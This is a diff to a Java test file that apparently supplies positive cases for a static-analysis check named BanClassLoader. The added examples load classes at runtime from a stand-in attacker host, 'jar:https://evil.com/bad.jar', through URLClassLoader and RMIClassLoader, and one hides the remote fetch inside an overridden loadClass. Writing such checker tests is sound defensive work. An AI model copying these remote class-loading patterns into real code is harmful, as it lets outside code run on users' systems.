@@ -24,23 +24,34 @@ import java.net.URL;
 import java.net.URLClassLoader;
 
 class BanClassLoaderPositiveCases {
-  /** Load a class using URLClassLoader. */
-  public static final Class<?> find() throws ClassNotFoundException, MalformedURLException {
-    URLClassLoader loader =
-        new URLClassLoader(new URL[] {new URL("eval.com")}) {
-          @Override
-          protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
-            // BUG: Diagnostic contains: BanClassLoader
-            return findClass(name);
-          }
-        };
-    return loader.loadClass("BadClass");
+  /** Override loadClass with an insecure implementation. */
+  // BUG: Diagnostic contains: BanClassLoader
+  class InsecureClassLoader extends URLClassLoader {
+    public InsecureClassLoader() {
+      super(new URL[0]);
+    }
+
+    @Override
+    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
+      try {
+        addURL(new URL("jar:https://evil.com/bad.jar"));
+      } catch (MalformedURLException e) {
+      }
+      return findClass(name);
+    }
   }
 
   /** Calling static methods in java.rmi.server.RMIClassLoader. */
   public static final Class<?> loadRMI() throws ClassNotFoundException, MalformedURLException {
     // BUG: Diagnostic contains: BanClassLoader
     return loadClass("evil.com", "BadClass");
+  }
+
+  /** Calling constructor of java.net.URLClassLoader. */
+  public ClassLoader loadFromURL() throws MalformedURLException {
+    // BUG: Diagnostic contains: BanClassLoader
+    URLClassLoader loader = new URLClassLoader(new URL[] {new URL("jar:https://evil.com/bad.jar")});
+    return loader;
   }
 
   /** Calling methods of nested class. */
